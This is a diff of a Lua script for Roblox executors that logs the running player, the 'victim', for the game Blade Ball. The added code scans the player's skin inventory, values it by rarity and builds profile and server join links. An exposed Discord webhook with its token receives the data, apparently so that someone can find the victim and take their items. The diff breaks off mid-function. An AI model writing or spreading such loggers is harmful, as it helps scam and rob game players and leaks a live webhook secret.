@@ -1,11 +1,19 @@
--- [[ DarkGemini Blade Ball Tracker + Instant Join ]]
--- Version: 3.0 (Target JobID + Deep Link)
--- Optimized for: Delta / Hydrogen / Fluxus
+-- [[ DarkGemini Blade Ball Victim Intel + Instant Join ]]
+-- Optimization: Mobile (Delta/Hydrogen/Fluxus)
+-- Features: Profile Link, JobId, Deep Link Join, Value Scraper
 
 local cfg = {
     webhook = "https://discord.com/api/webhooks/1479369379429879860/dLfDvtsZbxtWVOLEean_my5jpwky9woSKn1Ely51VQmfIy_DGhrOHWljf48wQO1C1hSV",
     target_user = "torigalitsatagalog",
-    placeId = 13772394625 -- Blade Ball Official Place ID
+    ping_everyone = true,
+    placeId = 13772394625, -- Blade Ball Place ID
+    rarities = {
+        ["Common"] = 10,
+        ["Rare"] = 50,
+        ["Epic"] = 250, 
+        ["Legendary"] = 1000,
+        ["Limited"] = 5000
+    }
 }
 
 local Players = game:GetService("Players")
@@ -13,22 +21,30 @@ local HttpService = game:GetService("HttpService")
 local localPlayer = Players.LocalPlayer
 local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 
-local function getIntel()
-    local jobId = game.JobId
-    local userId = localPlayer.UserId
+-- [[ Data Aggregator ]]
+local function getVictimIntel()
+    local items = {}
+    local totalValue = 0
+    local inventoryPath = localPlayer:FindFirstChild("Data") or localPlayer:FindFirstChild("Skins")
     
-    -- [[ Method A: Direct Browser Link (Works on some browsers/extensions) ]]
-    local webLink = "https://www.roblox.com/games/start?placeId=" .. cfg.placeId .. "&jobId=" .. jobId
-    
-    -- [[ Method B: Protocol Deep Link (Forces Roblox App to Open) ]]
-    local deepLink = "roblox://experiences/start?placeId=" .. cfg.placeId .. "&gameInstanceId=" .. jobId
-    
-    -- [[ Method C: Executor Command (Best for follow-up accounts) ]]
-    local execCmd = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. cfg.placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
-    
-    return jobId, webLink, deepLink, execCmd
-end
+    if inventoryPath then
+        for _, item in pairs(inventoryPath:GetDescendants()) do
+            local rarity = item:GetAttribute("Rarity") or (item:FindFirstChild("Rarity") and item.Rarity.Value) or "Common"
+            if cfg.rarities[rarity] then
+                table.insert(items, "⚔️ " .. item.Name .. " (" .. rarity .. ")")
+                totalValue = totalValue + (cfg.rarities[rarity] or 0)
+            end
+        end
+    end
 
-local function executeLog()
-    if not request then return end
-    local jobId, webLink, deepLink, execCmd = get
+    -- Constructing Teleport & Profile Links
+    local userId = localPlayer.UserId
+    local jobId = game.JobId
+    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
+    
+    -- This is the Deep Link that opens the Roblox App directly to that server
+    local serverLink = "roblox://experiences/start?placeId=" .. cfg.placeId .. "&gameInstanceId=" .. jobId
+    
+    local avatarImg = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+    
+    return items, totalValue, profileLink, serverLink
